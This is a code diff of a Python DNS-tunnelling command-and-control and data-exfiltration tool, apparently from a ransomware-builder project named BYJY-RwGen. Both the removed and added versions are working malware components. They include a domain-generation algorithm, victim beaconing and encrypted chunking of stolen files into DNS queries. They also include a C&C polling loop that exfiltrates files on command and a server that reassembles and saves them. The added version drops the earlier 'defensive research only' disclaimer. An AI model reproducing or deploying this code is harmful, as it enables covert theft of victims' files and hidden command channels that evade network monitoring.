@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-Advanced DNS Tunneling C&C Implementation
-High-performance covert channel for command and control
-For defensive cybersecurity research purposes only
+Advanced DNS Tunneling and Data Exfiltration - BYJY-RwGen
+Covert communication channel via DNS queries for C&C and data exfiltration
 """
 
 import dns.resolver
@@ -10,462 +9,532 @@ import dns.message
 import dns.query
 import dns.name
 import base64
-import zlib
 import json
 import time
 import random
+import string
 import threading
+import queue
 import hashlib
 import hmac
 import struct
-from typing import Dict, List, Optional, Tuple
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad, unpad
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import socket
-import requests
+import binascii
 
-
-class AdvancedDNSTunnel:
-    def __init__(self, c2_domain: str, dns_servers: List[str], encryption_key: bytes):
-        self.c2_domain = c2_domain
-        self.dns_servers = dns_servers
-        self.encryption_key = encryption_key
-        self.session_id = self._generate_session_id()
+class DNSTunnelClient:
+    """DNS Tunneling client for covert communication and data exfiltration"""
+    
+    def __init__(self, domain, dns_servers=None, encryption_key=None):
+        self.domain = domain
+        self.dns_servers = dns_servers or ['1.1.1.1', '8.8.8.8', '208.67.222.222']
+        self.session_id = self.generate_session_id()
         self.sequence_number = 0
-        self.chunk_size = 28  # DNS label limit minus overhead
-        self.max_retries = 5
-        self.jitter_range = (1, 5)  # Random delay range in seconds
         
-        # Domain generation algorithm parameters
-        self.dga_seed = "malware_campaign_2024_v3"
-        self.backup_domains = self._generate_backup_domains(10)
+        # Initialize encryption
+        if encryption_key:
+            self.cipher = self.init_encryption(encryption_key)
+        else:
+            self.cipher = None
+            
+        # Communication parameters
+        self.max_chunk_size = 28  # DNS label max size minus overhead
+        self.retry_attempts = 3
+        self.retry_delay = 1.0
+        self.jitter_range = (0.5, 2.0)
         
-        print(f"[+] DNS Tunnel initialized")
-        print(f"[+] Primary domain: {self.c2_domain}")
-        print(f"[+] Session ID: {self.session_id}")
+        # Statistics
+        self.stats = {
+            'queries_sent': 0,
+            'responses_received': 0,
+            'bytes_uploaded': 0,
+            'bytes_downloaded': 0,
+            'errors': 0
+        }
     
-    def _generate_session_id(self) -> str:
+    def init_encryption(self, password):
+        """Initialize Fernet encryption with password-derived key"""
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=b'byjy_salt_2024',
+            iterations=100000,
+        )
+        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
+        return Fernet(key)
+    
+    def generate_session_id(self):
         """Generate unique session identifier"""
-        timestamp = int(time.time())
-        random_bytes = get_random_bytes(4)
-        session_hash = hashlib.md5(f"{timestamp}{random_bytes.hex()}".encode()).hexdigest()[:8]
-        return session_hash
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
     
-    def _generate_backup_domains(self, count: int) -> List[str]:
-        """Generate backup domains using DGA"""
-        domains = []
-        current_seed = hashlib.md5(self.dga_seed.encode()).digest()
+    def encode_data(self, data):
+        """Encode and encrypt data for DNS transmission"""
+        if isinstance(data, str):
+            data = data.encode()
         
-        tlds = ['.com', '.net', '.org', '.info', '.biz', '.co']
-        domain_words = ['security', 'update', 'service', 'system', 'windows', 'microsoft', 
-                       'adobe', 'google', 'cdn', 'cache', 'api', 'cloud']
+        # Encrypt if cipher is available
+        if self.cipher:
+            data = self.cipher.encrypt(data)
         
-        for i in range(count):
-            # Generate pseudo-random domain
-            hash_input = current_seed + struct.pack('<I', i)
-            domain_hash = hashlib.sha256(hash_input).digest()
-            
-            # Select components based on hash
-            word1_idx = struct.unpack('<H', domain_hash[:2])[0] % len(domain_words)
-            word2_idx = struct.unpack('<H', domain_hash[2:4])[0] % len(domain_words)
-            tld_idx = struct.unpack('<B', domain_hash[4:5])[0] % len(tlds)
-            suffix = struct.unpack('<H', domain_hash[5:7])[0] % 1000
-            
-            domain = f"{domain_words[word1_idx]}-{domain_words[word2_idx]}-{suffix:03d}{tlds[tld_idx]}"
-            domains.append(domain)
-        
-        return domains
-    
-    def _encrypt_data(self, data: bytes) -> bytes:
-        """Encrypt data for transmission"""
-        iv = get_random_bytes(16)
-        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
-        padded_data = pad(data, AES.block_size)
-        ciphertext = cipher.encrypt(padded_data)
-        
-        # Add HMAC for integrity
-        hmac_key = hashlib.pbkdf2_hmac('sha256', self.encryption_key, b'HMAC_SALT', 10000, 32)
-        mac = hmac.new(hmac_key, iv + ciphertext, hashlib.sha256).digest()
-        
-        return iv + mac[:16] + ciphertext
-    
-    def _decrypt_data(self, encrypted_data: bytes) -> Optional[bytes]:
-        """Decrypt received data"""
-        if len(encrypted_data) < 32:
-            return None
-        
-        iv = encrypted_data[:16]
-        received_mac = encrypted_data[16:32]
-        ciphertext = encrypted_data[32:]
-        
-        # Verify HMAC
-        hmac_key = hashlib.pbkdf2_hmac('sha256', self.encryption_key, b'HMAC_SALT', 10000, 32)
-        expected_mac = hmac.new(hmac_key, iv + ciphertext, hashlib.sha256).digest()[:16]
-        
-        if not hmac.compare_digest(received_mac, expected_mac):
-            return None
-        
-        try:
-            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
-            padded_data = cipher.decrypt(ciphertext)
-            return unpad(padded_data, AES.block_size)
-        except:
-            return None
-    
-    def _encode_dns_data(self, data: bytes) -> str:
-        """Encode data for DNS transmission"""
-        # Compress data first
-        compressed = zlib.compress(data, level=9)
-        
-        # Base32 encoding (DNS-safe)
-        encoded = base64.b32encode(compressed).decode().lower().rstrip('=')
+        # Base32 encoding (DNS-safe, no padding issues)
+        encoded = base64.b32encode(data).decode().lower()
+        # Remove padding
+        encoded = encoded.rstrip('=')
         
         return encoded
     
-    def _decode_dns_data(self, encoded: str) -> Optional[bytes]:
-        """Decode data from DNS response"""
+    def decode_data(self, encoded_data):
+        """Decode and decrypt data from DNS response"""
         try:
-            # Add padding if necessary
-            missing_padding = 8 - (len(encoded) % 8)
-            if missing_padding != 8:
-                encoded += '=' * missing_padding
+            # Add padding back for base32
+            padding_needed = (8 - len(encoded_data) % 8) % 8
+            encoded_data += '=' * padding_needed
             
-            compressed = base64.b32decode(encoded.upper())
-            return zlib.decompress(compressed)
-        except:
+            # Decode from base32
+            data = base64.b32decode(encoded_data.upper())
+            
+            # Decrypt if cipher is available
+            if self.cipher:
+                data = self.cipher.decrypt(data)
+            
+            return data
+        except Exception as e:
+            print(f"Decode error: {e}")
             return None
     
-    def _create_dns_query(self, data: bytes) -> List[str]:
-        """Create DNS queries for data transmission"""
-        encrypted_data = self._encrypt_data(data)
-        encoded_data = self._encode_dns_data(encrypted_data)
-        
-        # Split into DNS-safe chunks
+    def chunk_data(self, data, chunk_size):
+        """Split data into DNS-safe chunks"""
         chunks = []
-        chunk_id = 0
-        total_chunks = (len(encoded_data) + self.chunk_size - 1) // self.chunk_size
-        
-        for i in range(0, len(encoded_data), self.chunk_size):
-            chunk = encoded_data[i:i + self.chunk_size]
-            
-            # Create subdomain with metadata
-            metadata = f"{self.session_id}.{chunk_id:04x}.{total_chunks:04x}.{self.sequence_number:08x}"
-            full_subdomain = f"{chunk}.{metadata}.{self.c2_domain}"
-            chunks.append(full_subdomain)
-            chunk_id += 1
-        
-        self.sequence_number += 1
+        for i in range(0, len(data), chunk_size):
+            chunks.append(data[i:i + chunk_size])
         return chunks
     
-    def _perform_dns_query(self, domain: str, query_type: str = 'TXT') -> Optional[str]:
-        """Perform DNS query with fallback servers"""
+    def build_query_domain(self, command, data=None, chunk_index=0, total_chunks=1):
+        """Build DNS query domain with embedded data"""
+        # Format: {session}.{seq}.{cmd}.{chunk_idx}.{total}.{data}.{domain}
+        
+        components = [
+            self.session_id,
+            f"{self.sequence_number:04x}",  # Hex sequence number
+            command[:3],  # Command truncated to 3 chars
+            f"{chunk_index:02x}",
+            f"{total_chunks:02x}"
+        ]
+        
+        if data:
+            # Split data into DNS label-sized chunks
+            data_chunks = self.chunk_data(data, 63)  # Max DNS label length
+            components.extend(data_chunks)
+        
+        # Add checksum for integrity
+        query_data = '.'.join(components)
+        checksum = hashlib.md5(query_data.encode()).hexdigest()[:4]
+        components.append(checksum)
+        
+        # Final domain
+        query_domain = '.'.join(components) + '.' + self.domain
+        
+        return query_domain
+    
+    def send_dns_query(self, query_domain, query_type='TXT'):
+        """Send DNS query with retry logic and jitter"""
         for dns_server in self.dns_servers:
-            try:
-                resolver = dns.resolver.Resolver()
-                resolver.nameservers = [dns_server]
-                resolver.timeout = 10
-                resolver.lifetime = 30
-                
-                if query_type == 'TXT':
-                    response = resolver.resolve(domain, 'TXT')
-                    return str(response[0]).strip('"')
-                elif query_type == 'A':
-                    response = resolver.resolve(domain, 'A')
-                    return str(response[0])
-                elif query_type == 'CNAME':
-                    response = resolver.resolve(domain, 'CNAME')
-                    return str(response[0])
+            for attempt in range(self.retry_attempts):
+                try:
+                    resolver = dns.resolver.Resolver()
+                    resolver.nameservers = [dns_server]
+                    resolver.timeout = 10
+                    resolver.lifetime = 30
                     
-            except Exception as e:
-                print(f"[!] DNS query failed for {dns_server}: {e}")
-                continue
+                    # Send query
+                    response = resolver.resolve(query_domain, query_type)
+                    
+                    self.stats['queries_sent'] += 1
+                    self.stats['responses_received'] += 1
+                    
+                    # Extract response data
+                    response_data = []
+                    for rdata in response:
+                        if query_type == 'TXT':
+                            # TXT records can contain our response data
+                            txt_data = str(rdata).strip('"')
+                            response_data.append(txt_data)
+                    
+                    return response_data
+                    
+                except Exception as e:
+                    self.stats['errors'] += 1
+                    print(f"DNS query failed (server: {dns_server}, attempt: {attempt+1}): {e}")
+                    
+                    # Jitter delay
+                    delay = self.retry_delay * random.uniform(*self.jitter_range)
+                    time.sleep(delay)
         
         return None
     
-    def send_command_request(self, victim_info: Dict) -> Optional[Dict]:
-        """Send victim information and request commands"""
+    def send_command(self, command, data=None):
+        """Send command through DNS tunnel"""
+        if data:
+            encoded_data = self.encode_data(data)
+            chunks = self.chunk_data(encoded_data, self.max_chunk_size)
+        else:
+            chunks = ['']
+        
+        responses = []
+        
+        for i, chunk in enumerate(chunks):
+            query_domain = self.build_query_domain(
+                command, chunk, i, len(chunks)
+            )
+            
+            print(f"[+] Sending DNS query: {query_domain}")
+            
+            response = self.send_dns_query(query_domain)
+            if response:
+                responses.extend(response)
+            
+            # Increment sequence number
+            self.sequence_number += 1
+            
+            # Add jitter between chunks
+            if i < len(chunks) - 1:
+                time.sleep(random.uniform(0.1, 0.5))
+        
+        return responses
+    
+    def exfiltrate_file(self, file_path, file_type='document'):
+        """Exfiltrate file through DNS tunnel"""
         try:
-            # Prepare victim data
-            victim_data = {
-                'session_id': self.session_id,
-                'timestamp': int(time.time()),
-                'victim_info': victim_info,
-                'request_type': 'command_request'
+            with open(file_path, 'rb') as f:
+                file_data = f.read()
+            
+            # Prepare file metadata
+            file_info = {
+                'name': file_path.split('/')[-1],
+                'size': len(file_data),
+                'type': file_type,
+                'timestamp': int(time.time())
             }
             
-            serialized_data = json.dumps(victim_data).encode('utf-8')
+            # Send file info first
+            info_response = self.send_command('info', json.dumps(file_info))
             
-            # Create DNS queries
-            dns_queries = self._create_dns_query(serialized_data)
+            # Send file data in chunks
+            encoded_file = self.encode_data(file_data)
+            chunk_size = self.max_chunk_size * 10  # Larger chunks for file data
             
-            # Send queries with jitter
-            for query in dns_queries:
-                response = self._perform_dns_query(query, 'TXT')
-                if response:
-                    print(f"[+] DNS response received: {response[:50]}...")
+            total_chunks = (len(encoded_file) + chunk_size - 1) // chunk_size
+            
+            for i in range(total_chunks):
+                start_idx = i * chunk_size
+                end_idx = min((i + 1) * chunk_size, len(encoded_file))
+                chunk_data = encoded_file[start_idx:end_idx]
                 
-                # Add random jitter
-                jitter = random.uniform(*self.jitter_range)
-                time.sleep(jitter)
-            
-            # Query for command response
-            return self._get_command_response()
-            
-        except Exception as e:
-            print(f"[-] Failed to send command request: {e}")
-            return None
-    
-    def _get_command_response(self) -> Optional[Dict]:
-        """Retrieve command from C&C server"""
-        try:
-            # Query specific subdomain for commands
-            command_domain = f"cmd.{self.session_id}.{self.c2_domain}"
-            
-            # Try multiple query types
-            for query_type in ['TXT', 'CNAME', 'A']:
-                response = self._perform_dns_query(command_domain, query_type)
-                if response and len(response) > 10:  # Valid response threshold
-                    
-                    if query_type == 'A':
-                        # Decode IP address to data
-                        response = self._decode_ip_response(response)
-                    
-                    decoded_data = self._decode_dns_data(response)
-                    if decoded_data:
-                        decrypted_data = self._decrypt_data(decoded_data)
-                        if decrypted_data:
-                            try:
-                                return json.loads(decrypted_data.decode('utf-8'))
-                            except:
-                                pass
-            
-            return None
-            
-        except Exception as e:
-            print(f"[-] Failed to get command response: {e}")
-            return None
-    
-    def _decode_ip_response(self, ip_address: str) -> str:
-        """Decode data from IP address response"""
-        try:
-            octets = ip_address.split('.')
-            if len(octets) != 4:
-                return ""
-            
-            # Convert octets to encoded string
-            encoded_chars = []
-            for octet in octets:
-                if 32 <= int(octet) <= 126:  # Printable ASCII
-                    encoded_chars.append(chr(int(octet)))
-            
-            return ''.join(encoded_chars)
-        except:
-            return ""
-    
-    def exfiltrate_data(self, data: bytes, data_type: str = "general") -> bool:
-        """Exfiltrate sensitive data via DNS"""
-        try:
-            # Prepare exfiltration packet
-            exfil_data = {
-                'session_id': self.session_id,
-                'timestamp': int(time.time()),
-                'data_type': data_type,
-                'data_size': len(data),
-                'data': base64.b64encode(data).decode('ascii')
-            }
-            
-            serialized_data = json.dumps(exfil_data).encode('utf-8')
-            
-            # Split large data into multiple transmissions
-            max_size = 1024  # Maximum size per transmission
-            offset = 0
-            part = 0
-            
-            while offset < len(serialized_data):
-                chunk = serialized_data[offset:offset + max_size]
-                
-                # Add part information
-                part_info = {
-                    'part': part,
-                    'total_parts': (len(serialized_data) + max_size - 1) // max_size,
-                    'chunk': base64.b64encode(chunk).decode('ascii')
+                # Send chunk
+                chunk_info = {
+                    'file': file_info['name'],
+                    'chunk': i,
+                    'total': total_chunks,
+                    'data': chunk_data
                 }
                 
-                # Create DNS queries for this part
-                dns_queries = self._create_dns_query(json.dumps(part_info).encode('utf-8'))
+                response = self.send_command('file', json.dumps(chunk_info))
                 
-                # Send with retries
-                success = False
-                for retry in range(self.max_retries):
-                    try:
-                        for query in dns_queries:
-                            self._perform_dns_query(query, 'TXT')
-                        success = True
-                        break
-                    except:
-                        time.sleep(2 ** retry)  # Exponential backoff
+                self.stats['bytes_uploaded'] += len(chunk_data)
                 
-                if not success:
-                    print(f"[-] Failed to exfiltrate part {part}")
-                    return False
+                print(f"[+] Uploaded chunk {i+1}/{total_chunks} for {file_info['name']}")
                 
-                offset += max_size
-                part += 1
-                
-                # Rate limiting
-                time.sleep(random.uniform(2, 8))
+                # Progress delay
+                time.sleep(random.uniform(0.5, 1.5))
             
-            print(f"[+] Successfully exfiltrated {len(data)} bytes via DNS")
             return True
             
         except Exception as e:
-            print(f"[-] Data exfiltration failed: {e}")
+            print(f"File exfiltration failed: {e}")
             return False
     
-    def heartbeat(self) -> bool:
-        """Send heartbeat to maintain C&C connection"""
-        try:
-            heartbeat_data = {
-                'session_id': self.session_id,
-                'timestamp': int(time.time()),
-                'request_type': 'heartbeat',
-                'status': 'active'
-            }
-            
-            serialized_data = json.dumps(heartbeat_data).encode('utf-8')
-            dns_queries = self._create_dns_query(serialized_data)
-            
-            # Send heartbeat query
-            for query in dns_queries[:1]:  # Only send first chunk for heartbeat
-                response = self._perform_dns_query(query, 'TXT')
-                if response:
-                    return True
-            
-            return False
-            
-        except Exception as e:
-            print(f"[-] Heartbeat failed: {e}")
-            return False
-    
-    def test_connectivity(self) -> bool:
-        """Test DNS tunnel connectivity"""
-        print("[+] Testing DNS tunnel connectivity...")
-        
-        # Test primary domain
-        test_domain = f"test.{self.session_id}.{self.c2_domain}"
-        response = self._perform_dns_query(test_domain, 'TXT')
+    def receive_command(self):
+        """Receive commands from C&C server"""
+        response = self.send_command('poll')
         
         if response:
-            print(f"[+] Primary domain responsive: {self.c2_domain}")
-            return True
+            for resp in response:
+                try:
+                    # Decode command from response
+                    command_data = self.decode_data(resp)
+                    if command_data:
+                        return json.loads(command_data.decode())
+                except Exception as e:
+                    print(f"Command decode error: {e}")
         
-        # Test backup domains
-        for backup_domain in self.backup_domains[:3]:  # Test first 3 backups
-            test_domain = f"test.{self.session_id}.{backup_domain}"
-            response = self._perform_dns_query(test_domain, 'TXT')
-            if response:
-                print(f"[+] Backup domain responsive: {backup_domain}")
-                self.c2_domain = backup_domain  # Switch to working domain
-                return True
-        
-        print("[-] No responsive domains found")
-        return False
-
-
-class DNSServerMimic:
-    """Simple DNS server for research/testing purposes"""
+        return None
     
-    def __init__(self, listen_port: int = 5353):
-        self.listen_port = listen_port
-        self.running = False
-        
-    def start_server(self):
-        """Start DNS server for testing"""
-        self.running = True
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.bind(('127.0.0.1', self.listen_port))
-        
-        print(f"[+] DNS server listening on port {self.listen_port}")
-        
-        while self.running:
-            try:
-                data, addr = sock.recvfrom(512)
-                response = self._process_dns_query(data)
-                if response:
-                    sock.sendto(response, addr)
-            except:
-                pass
-        
-        sock.close()
-    
-    def _process_dns_query(self, query_data: bytes) -> Optional[bytes]:
-        """Process incoming DNS query"""
-        try:
-            # Parse DNS query
-            query = dns.message.from_wire(query_data)
-            
-            # Create response
-            response = dns.message.make_response(query)
-            
-            # Add fake TXT record
-            fake_response = "ZGF0YXBheWxvYWQ="  # Base64 encoded fake data
-            txt_record = dns.rrset.from_text(
-                query.question[0].name,
-                300,  # TTL
-                'IN',
-                'TXT',
-                f'"{fake_response}"'
-            )
-            response.answer.append(txt_record)
-            
-            return response.to_wire()
-            
-        except Exception as e:
-            print(f"[!] DNS query processing error: {e}")
-            return None
-
-
-# Example usage for defensive research
-if __name__ == "__main__":
-    # Configuration for research testing
-    c2_domain = "research-c2-server.local"
-    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
-    encryption_key = hashlib.sha256(b"research_encryption_key_2024").digest()
-    
-    # Initialize DNS tunnel
-    tunnel = AdvancedDNSTunnel(c2_domain, dns_servers, encryption_key)
-    
-    # Test connectivity
-    if tunnel.test_connectivity():
-        print("[+] DNS tunnel operational")
-        
-        # Simulate victim information
-        victim_info = {
-            "hostname": "research-victim-01",
-            "os": "Windows 11 Pro",
-            "domain": "research.local",
-            "ip_address": "192.168.1.100",
-            "installed_av": "Windows Defender",
-            "privilege_level": "admin",
-            "network_shares": ["\\\\server\\shared"],
-            "encryption_targets_found": 1250
+    def send_heartbeat(self):
+        """Send heartbeat to maintain session"""
+        system_info = {
+            'session': self.session_id,
+            'timestamp': int(time.time()),
+            'status': 'active',
+            'stats': self.stats
         }
         
-        # Send command request
-        commands = tunnel.send_command_request(victim_info)
-        if commands:
-            print(f"[+] Received commands: {commands}")
-        
-        # Example data exfiltration
-        sensitive_data = b"Research sample sensitive data for testing"
-        tunnel.exfiltrate_data(sensitive_data, "credentials")
-        
-        # Send heartbeat
-        tunnel.heartbeat()
-        
-    else:
-        print("[-] DNS tunnel connectivity test failed")
+        return self.send_command('hb', json.dumps(system_info))
     
-    print("\n[!] This DNS tunnel implementation is for defensive research only!")
-    print("[!] Use in controlled, authorized environments only!")
+    def start_c2_loop(self, poll_interval=300):
+        """Start continuous C&C communication loop"""
+        print(f"[+] Starting DNS C&C loop (session: {self.session_id})")
+        
+        while True:
+            try:
+                # Send heartbeat
+                self.send_heartbeat()
+                
+                # Check for commands
+                command = self.receive_command()
+                if command:
+                    self.process_command(command)
+                
+                # Wait with jitter
+                delay = poll_interval * random.uniform(0.8, 1.2)
+                time.sleep(delay)
+                
+            except KeyboardInterrupt:
+                print("\n[+] C&C loop interrupted")
+                break
+            except Exception as e:
+                print(f"C&C loop error: {e}")
+                time.sleep(60)  # Longer delay on error
+    
+    def process_command(self, command):
+        """Process command received from C&C"""
+        cmd_type = command.get('type')
+        
+        if cmd_type == 'exfil':
+            # Exfiltrate specified files
+            file_paths = command.get('files', [])
+            for file_path in file_paths:
+                self.exfiltrate_file(file_path)
+        
+        elif cmd_type == 'info':
+            # Send system information
+            import platform
+            import os
+            
+            sys_info = {
+                'hostname': platform.node(),
+                'os': platform.system(),
+                'arch': platform.machine(),
+                'user': os.getenv('USER', 'unknown'),
+                'cwd': os.getcwd()
+            }
+            
+            self.send_command('sysinfo', json.dumps(sys_info))
+        
+        elif cmd_type == 'download':
+            # Download and execute payload
+            payload_url = command.get('url')
+            if payload_url:
+                print(f"[!] Download command: {payload_url}")
+        
+        print(f"[+] Processed command: {cmd_type}")
+
+class DNSTunnelServer:
+    """DNS Tunnel server for receiving exfiltrated data"""
+    
+    def __init__(self, listen_ip='0.0.0.0', listen_port=53):
+        self.listen_ip = listen_ip
+        self.listen_port = listen_port
+        self.sessions = {}
+        self.received_files = {}
+        
+    def start_server(self):
+        """Start DNS server to receive tunneled data"""
+        print(f"[+] Starting DNS tunnel server on {self.listen_ip}:{self.listen_port}")
+        
+        # Create UDP socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.bind((self.listen_ip, self.listen_port))
+        
+        while True:
+            try:
+                data, addr = sock.recvfrom(1024)
+                
+                # Parse DNS query
+                try:
+                    dns_msg = dns.message.from_wire(data)
+                    self.process_dns_query(dns_msg, addr, sock)
+                except Exception as e:
+                    print(f"DNS parsing error: {e}")
+                    
+            except Exception as e:
+                print(f"Server error: {e}")
+    
+    def process_dns_query(self, dns_msg, client_addr, sock):
+        """Process incoming DNS query and extract tunneled data"""
+        for question in dns_msg.question:
+            query_name = str(question.name).lower()
+            
+            # Parse tunneled data from domain name
+            if self.parse_tunneled_data(query_name):
+                # Send response
+                response = self.build_dns_response(dns_msg, query_name)
+                sock.sendto(response.to_wire(), client_addr)
+    
+    def parse_tunneled_data(self, query_name):
+        """Parse and store tunneled data from DNS query"""
+        try:
+            parts = query_name.split('.')
+            if len(parts) < 6:
+                return False
+            
+            session_id = parts[0]
+            seq_num = parts[1]
+            command = parts[2]
+            chunk_idx = int(parts[3], 16)
+            total_chunks = int(parts[4], 16)
+            
+            # Extract data parts
+            data_parts = parts[5:-2]  # Exclude checksum and domain
+            data = '.'.join(data_parts)
+            
+            # Store data by session
+            if session_id not in self.sessions:
+                self.sessions[session_id] = {}
+            
+            session = self.sessions[session_id]
+            
+            if command not in session:
+                session[command] = {}
+            
+            session[command][chunk_idx] = data
+            
+            # Check if all chunks received
+            if len(session[command]) == total_chunks:
+                # Reassemble data
+                complete_data = ''
+                for i in range(total_chunks):
+                    complete_data += session[command].get(i, '')
+                
+                # Process complete command
+                self.process_complete_command(session_id, command, complete_data)
+                
+                # Clear processed chunks
+                del session[command]
+            
+            return True
+            
+        except Exception as e:
+            print(f"Data parsing error: {e}")
+            return False
+    
+    def process_complete_command(self, session_id, command, data):
+        """Process complete reassembled command"""
+        print(f"[+] Complete command from {session_id}: {command}")
+        
+        if command == 'file':
+            self.process_file_data(session_id, data)
+        elif command == 'info':
+            self.process_file_info(session_id, data)
+        elif command == 'hb':
+            self.process_heartbeat(session_id, data)
+    
+    def process_file_data(self, session_id, data):
+        """Process exfiltrated file data"""
+        try:
+            # Decode file chunk
+            client = DNSTunnelClient('')  # For decode functions
+            decoded_data = client.decode_data(data)
+            
+            if decoded_data:
+                chunk_info = json.loads(decoded_data.decode())
+                
+                filename = chunk_info['file']
+                chunk_num = chunk_info['chunk']
+                total_chunks = chunk_info['total']
+                chunk_data = chunk_info['data']
+                
+                # Store chunk
+                file_key = f"{session_id}_{filename}"
+                if file_key not in self.received_files:
+                    self.received_files[file_key] = {}
+                
+                self.received_files[file_key][chunk_num] = chunk_data
+                
+                print(f"[+] Received file chunk {chunk_num+1}/{total_chunks} for {filename}")
+                
+                # Check if file is complete
+                if len(self.received_files[file_key]) == total_chunks:
+                    self.save_complete_file(session_id, filename)
+        
+        except Exception as e:
+            print(f"File processing error: {e}")
+    
+    def save_complete_file(self, session_id, filename):
+        """Save complete exfiltrated file"""
+        try:
+            file_key = f"{session_id}_{filename}"
+            chunks = self.received_files[file_key]
+            
+            # Reassemble file data
+            complete_data = ''
+            for i in range(len(chunks)):
+                complete_data += chunks[i]
+            
+            # Decode complete file
+            client = DNSTunnelClient('')
+            file_data = client.decode_data(complete_data)
+            
+            if file_data:
+                # Save to disk
+                output_path = f"exfiltrated_{session_id}_{filename}"
+                with open(output_path, 'wb') as f:
+                    f.write(file_data)
+                
+                print(f"[+] Saved exfiltrated file: {output_path}")
+                
+                # Cleanup
+                del self.received_files[file_key]
+        
+        except Exception as e:
+            print(f"File save error: {e}")
+    
+    def build_dns_response(self, query_msg, query_name):
+        """Build DNS response with optional command data"""
+        response = dns.message.make_response(query_msg)
+        
+        # Add TXT record with response data (if any)
+        # This could contain commands for the client
+        
+        return response
+
+# Command-line interface
+def main():
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='DNS Tunnel Client/Server')
+    parser.add_argument('mode', choices=['client', 'server'], help='Operation mode')
+    parser.add_argument('--domain', default='c2.example.com', help='C&C domain')
+    parser.add_argument('--dns-servers', nargs='+', default=['1.1.1.1', '8.8.8.8'], help='DNS servers')
+    parser.add_argument('--key', help='Encryption key')
+    parser.add_argument('--file', help='File to exfiltrate (client mode)')
+    
+    args = parser.parse_args()
+    
+    if args.mode == 'client':
+        client = DNSTunnelClient(args.domain, args.dns_servers, args.key)
+        
+        if args.file:
+            print(f"[+] Exfiltrating file: {args.file}")
+            client.exfiltrate_file(args.file)
+        else:
+            print("[+] Starting C&C communication loop")
+            client.start_c2_loop()
+    
+    elif args.mode == 'server':
+        server = DNSTunnelServer()
+        server.start_server()
+
+if __name__ == "__main__":
+    main()
